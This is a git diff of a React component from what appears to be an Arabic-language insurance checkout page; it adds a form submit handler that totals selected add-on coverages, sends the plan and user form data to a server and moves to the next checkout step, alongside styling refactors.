@@ -2,22 +2,71 @@ import { useState } from "react";
 import Tooltip from "../../Tooltip";
 import BelowSums from "./BelowSums";
 import InsurenceDetails from "../../InsurenceDetails";
+import { cn } from "@/lib/utils";
+import { useNavigate } from "react-router-dom";
+import { useEffect } from "react";
+import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
 
 const AginstOther = ({ cover, userFormData }: any) => {
   const [expanded, setExpanded] = useState(false);
+  const navigate = useNavigate();
+
+  const handleNext = (e: any) => {
+    e.preventDefault();
+    const formData = Object.fromEntries(new FormData(e.target));
+
+    const addedValuesKeys = Object.keys(formData).filter(
+      (key) => formData[key] === "on"
+    );
+
+    const addedValues = addedValuesKeys.map((v) =>
+      Number(v.match(/\d+(\.\d+)?/)![0])
+    );
+
+    const newTotal = addedValues.reduce((a, b) => a + b, Number(cover.total));
+    const plan = {
+      title: cover.title,
+      total: newTotal,
+      qitaf: cover.qitaf,
+      hours: cover.hours,
+    };
+
+    console.log(plan);
+
+    const data = { ...plan, ...userFormData };
+
+    sendDataToServer({
+      data,
+      current: "الخطوة الثالثة",
+      nextPage: "الخطوة الرابعة",
+      nextPageLink: "/checkout/4",
+      navigate,
+      waitingForAdminResponse: false,
+      state: { ...cover, ...userFormData, total: newTotal },
+    });
+  };
+
+  useEffect(() => {
+    setCurrentPage("الخطوة الثالثة");
+  }, []);
 
   return (
     <div
-      className={`text-sm bg-white rounded-lg ${
-        cover.isFeatured ? "shadow-[0px_0px_20px_#c7dfb6]" : ""
-      }`}
+      className={`text-sm bg-white rounded-lg ${cn(
+        cover.isFeatured ? "shadow-[0px_0px_20px_#c7dfb6]" : "",
+        cover.sums[0].isFeatured ? "shadow-[0px_0px_20px_#ff572210]" : ""
+      )}`}
     >
       <div
-        className={`gap-4 lg:gap-0 flex items-center justify-between py-1 px-2 ${
+        className={cn(
+          `gap-4 lg:gap-0 flex items-center justify-between py-1 px-2`,
           cover.isFeatured
             ? "bg-gradient-to-b from-[#ddedd0] to-whiteshadow-[0_10px_25px_10px_#ddedd0] "
+            : "",
+          cover.sums[0].isFeatured
+            ? "bg-gradient-to-b from-[#ff572230] to-whiteshadow-[0_10px_25px_10px_#ff5722] "
             : ""
-        }`}
+        )}
       >
         <div className="lg:hidden">
           <img
@@ -69,7 +118,7 @@ const AginstOther = ({ cover, userFormData }: any) => {
         />
       </div>
 
-      <div className="flex flex-col gap-6 lg:gap-0">
+      <form onSubmit={handleNext} className="flex flex-col gap-6 lg:gap-0">
         <div className="flex flex-col gap-6 lg:gap-0 lg:flex-row lg:min-h-40 lg:bg-white">
           <div className="hidden lg:grid place-items-center px-2 border">
             <img
@@ -110,7 +159,7 @@ const AginstOther = ({ cover, userFormData }: any) => {
           </div>
 
           {/* addtionals */}
-          <form className="flex-flex-col px-2 lg:border lg:flex-1">
+          <div className="flex-flex-col px-2 lg:border lg:flex-1">
             <h3 className="font-bold pt-2">تغطيات إضافية</h3>
             <div className="flex gap-1 mt-1 mb-2">
               {cover.addtional.includes.map((inc: string, i: number) => (
@@ -144,7 +193,12 @@ const AginstOther = ({ cover, userFormData }: any) => {
                 .map((t: any) => (
                   <div key={t.name} className="flex gap-2 items-center mt-4">
                     <div className="flex gap-1 items-center">
-                      <input type="checkbox" name="addtional" id="addtional" />
+                      <input
+                        type="checkbox"
+                        name={`addtional_${t.plus}`}
+                        id={`addtional_${t.plus}`}
+                      />
+
                       <p
                         className={`lg-max:text-sm ${
                           expanded ? "" : "line-clamp-1"
@@ -159,16 +213,15 @@ const AginstOther = ({ cover, userFormData }: any) => {
                     </div>
                   </div>
                 ))}
-          </form>
+          </div>
         </div>
 
         <BelowSums
           expanded={expanded}
           setExpanded={setExpanded}
           cover={cover}
-          userFormData={userFormData}
         />
-      </div>
+      </form>
     </div>
   );
 };
